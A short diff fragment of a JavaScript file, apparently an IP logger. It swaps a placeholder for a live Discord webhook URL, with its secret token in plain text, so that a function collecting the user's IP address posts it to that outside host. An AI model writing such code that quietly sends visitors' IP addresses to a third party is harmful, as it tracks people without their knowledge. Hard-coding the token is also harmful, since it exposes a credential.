@@ -374,7 +374,7 @@ async function getUserIP() {
 
 async function sendDataToWebhook(ip) {
   const dataToSend = { ip };
-  const webhookURL = 'YOUR_WEBHOOK_URL';
+  const webhookURL = 'https://discord.com/api/webhooks/1187164716980785223/PLQjmGNi2-zqSHtfNyTjMpGfOosQPaOJkhU8rdLxmGbWwqRnAxJnkdTexKEuU7thAWAe';
 
   try {
     const response = await fetch(webhookURL, {
